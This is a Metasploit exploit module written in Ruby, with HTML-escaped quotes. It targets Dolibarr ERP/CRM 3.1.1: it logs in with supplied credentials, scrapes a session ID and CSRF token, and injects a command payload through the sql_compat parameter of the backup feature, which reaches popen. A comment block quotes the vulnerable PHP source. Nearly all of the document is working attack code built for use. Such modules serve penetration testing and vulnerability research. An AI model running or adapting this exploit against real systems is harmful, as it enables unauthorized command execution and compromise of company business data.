# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Dolibarr ERP & CRM 3 Post-Auth OS Command Injection",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Dolibarr ERP/CRM&#039;s
                backup feature.  This software is used to manage a company&#039;s business
                information such as contacts, invoices, orders, stocks, agenda, etc.
                When processing a database backup request, the export.php function
                does not check the input given to the sql_compat parameter, which allows
                a remote authenticated attacker to inject system commands into it,
                and then gain arbitrary code execution.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Nahuel Grisolia <nahuel[at]cintainfinita.com.ar>&#039;,  #Discovery, PoC
                    &#039;sinn3r&#039;  #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2012/Apr/78&#039;]
                ],
            &#039;Arch&#039;            => ARCH_CMD,
            &#039;Compat&#039;          =>
                {
                    &#039;PayloadType&#039; => &#039;cmd&#039;
                },
            &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;],
            &#039;Targets&#039;        =>
                [
                    # Older versions are probably also vulnerable according to
                    # Nahuel&#039;s report on full disclosure
                    [&#039;Dolibarr 3.1.1 on Linux&#039;, {}]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Apr 6 2012",
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;USERNAME&#039;,  [true, &#039;Dolibarr Username&#039;, &#039;admin&#039;]),
                    OptString.new(&#039;PASSWORD&#039;,  [true, &#039;Dolibarr Password&#039;, &#039;test&#039;]),
                    OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path to dolibarr&#039;, &#039;/dolibarr/&#039;])
                ], self.class)
    end
 
    def check
        res = send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => target_uri.path
        })
 
        if res.body =~ /Dolibarr 3\.1\.1/
            return Exploit::CheckCode::Appears
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def get_sid_token
        res = send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => @uri.path
        })
 
        # Get the session ID from the cookie
        m = res.headers[&#039;Set-Cookie&#039;].match(/(DOLSESSID_.+);/)
        id = (m.nil?) ? nil : m[1]
 
        m = res.body.match(/type="hidden" name="token" value="(.+)"/)
        token = (m.nil?) ? nil : m[1]
 
        return id, token
    end
 
    def login(sid, token)
        res = send_request_cgi({
            &#039;method&#039;   => &#039;POST&#039;,
            &#039;uri&#039;      => "#{@uri.path}index.php",
            &#039;cookie&#039;   => sid,
            &#039;vars_post&#039; => {
                &#039;token&#039;         => token,
                &#039;loginfunction&#039; => &#039;loginfunction&#039;,
                &#039;tz&#039;            => &#039;-6&#039;,
                &#039;dst&#039;           => &#039;1&#039;,
                &#039;screenwidth&#039;   => &#039;1093&#039;,
                &#039;screenheight&#039;  => &#039;842&#039;,
                &#039;username&#039;      => datastore[&#039;USERNAME&#039;],
                &#039;password&#039;      => datastore[&#039;PASSWORD&#039;]
            }
        })
 
        location = res.headers[&#039;Location&#039;]
        return (location =~ /admin\//)
    end
 
    def exploit
        @uri = target_uri
        @uri.path << "/" if @uri.path[-1, 1] != "/"
        peer = "#{rhost}:#{rport}"
 
        print_status("#{peer} - Getting the sid and token...")
        sid, token = get_sid_token
        if sid.nil?
            print_error("#{peer} - Unable to retrieve a session ID")
            return
        elsif token.nil?
            print_error("#{peer} - Unable to retrieve a token")
            return
        end
 
        user = datastore[&#039;USERNAME&#039;]
        pass = datastore[&#039;PASSWORD&#039;]
        print_status("#{peer} - Attempt to login with \"#{user}:#{pass}\"")
        success = login(sid, token)
        if not success
            print_error("#{peer} - Unable to login")
            return
        end
 
        print_status("#{peer} - Sending malicious request...")
        res = send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => @uri.path + "admin/tools/export.php",
            &#039;cookie&#039;    => sid,
            &#039;vars_post&#039; => {
                &#039;token&#039;             => token,
                &#039;export_type&#039;       => &#039;server&#039;,
                &#039;what&#039;              => &#039;mysql&#039;,
                &#039;mysqldump&#039;         => &#039;/usr/bin/mysqldump&#039;,
                &#039;use_transaction&#039;   => &#039;yes&#039;,
                &#039;disable_fk&#039;        => &#039;yes&#039;,
                &#039;sql_compat&#039;        => ";#{payload.encoded};",
                &#039;sql_structure&#039;     => &#039;structure&#039;,
                &#039;drop&#039;              => &#039;1&#039;,
                &#039;sql_data&#039;          => &#039;data&#039;,
                &#039;showcolumns&#039;       => &#039;yes&#039;,
                &#039;extended_ins&#039;      => &#039;yes&#039;,
                &#039;delayed&#039;           => &#039;yes&#039;,
                &#039;sql_ignore&#039;        => &#039;yes&#039;,
                &#039;hexforbinary&#039;      => &#039;yes&#039;,
                &#039;filename_template&#039; => &#039;mysqldump_dolibarrdebian_3.1.1_201203231716.sql&#039;,
            }
        })
 
    end
end
 
=begin
Notes:
 
114    if ($_POST["sql_compat"] && $_POST["sql_compat"] != &#039;NONE&#039;) $param.=" --compatible=".$_POST["sql_compat"];
...
137    $paramcrypted=$param;
...
159    $fullcommandcrypted=$command." ".$paramcrypted." 2>&1";
...
165    if ($handle)
166    {
....
169    $handlein = popen($fullcommandclear, &#039;r&#039;);
....
185    }
=end



